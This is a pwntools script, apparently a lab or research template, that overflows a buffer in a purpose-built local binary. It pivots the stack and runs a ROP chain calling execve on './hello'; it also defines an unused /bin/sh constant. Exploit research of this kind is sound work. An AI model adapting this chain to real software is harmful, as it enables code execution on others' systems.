# coding: utf-8
from pwn import *
import cle

p = remote('127.0.0.1',41010) #服务器端口号需提取
#set binary file of vul file
file = "../vul"

ld = cle.Loader(file)

#set offset 6 for call_preceed_rop or 4 for others
offset = 6

writeable_addr =  ld.main_object.sections_map['.data'].vaddr #addr of section .data

#useful gadgets' addr
POP_RAX = ld.main_object.get_symbol('set_rax').linked_addr + offset
POP_RCX = ld.main_object.get_symbol('set_rcx').linked_addr + offset
POP_RDX = ld.main_object.get_symbol('set_rdx').linked_addr + offset
POP_RSI = ld.main_object.get_symbol('set_rsi').linked_addr + offset
POP_RDI = ld.main_object.get_symbol('set_rdi').linked_addr + offset
MOV_RSI_RDI = ld.main_object.get_symbol('mov_rsi_rdi').linked_addr + offset
SYSCALL = ld.main_object.get_symbol('set_syscall').linked_addr + offset

#set rsp for not stack overflow vul
SET_RSP = ld.main_object.get_symbol('set_rsp').linked_addr + offset
BIN_SH = 0x68732f6e69622f2f #/bin/sh string
HELLO = 0x6f6c6c65682f2e

chain = (
    #set index = p64(POP_RDI+1) for cop or p64(POP_RDI) for others
    p64(POP_RDI)
    + p64(HELLO)

    + p64(POP_RSI)
    + p64(writeable_addr)

    + p64(MOV_RSI_RDI)

    + p64(POP_RDI)
    + p64(writeable_addr)

    + p64(POP_RSI)
    + p64(0)

    + p64(POP_RDX)
    + p64(0)

    + p64(POP_RAX)
    + p64(59)

    + p64(SYSCALL)
    )

#set payload = 'A'*24 + p64(SET_RSP) + 'B'*488 + chain for heap overflow vul or 'A'*512 + 'B'*8 + chain for others
payload = 'A'*24 + p64(SET_RSP) + 'B'*488 + chain

p.writeline(payload)
#p.interactive()
